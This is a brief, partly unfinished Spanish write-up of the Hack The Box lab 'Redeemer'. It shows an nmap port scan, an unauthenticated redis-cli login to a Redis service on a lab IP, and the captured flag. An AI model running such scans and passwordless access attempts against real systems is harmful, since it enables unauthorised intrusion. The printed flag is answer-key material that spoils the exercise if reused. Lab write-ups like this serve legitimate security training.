---
title: Hack the box- Redeemer
date: 2026-09-24
platform: Hack the box
difficulty: Very Easy
os: Linux
tags:
  - Redis
status: ""
---

# Resumen Ejecutivo
**IP Objetivo:** `10.129.234.51`
**Descripción breve:** 

---

## 1. Information Gathering (Reconocimiento)

### Escaneo de Puertos
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.129.234.51 -n -Pn -oG escaneo   
```

**Puertos Abiertos:**
- 6379 (Redis)

---

## 2. Vulnerability Assessment (Análisis de Vulnerabilidades)
- Intentamos acceder al servicio de redis

---

## 3. Exploitation (Acceso Inicial)

### Metodología
1. Vemos si nos deja entrar sin contraseña
### Ejecución
```bash
redis-cli -h 10.129.234.51 -p 6379
```

**Prueba de acceso (User Flag):**
```bash
03e1d2b376c37ab3f5319922053953eb
```

---
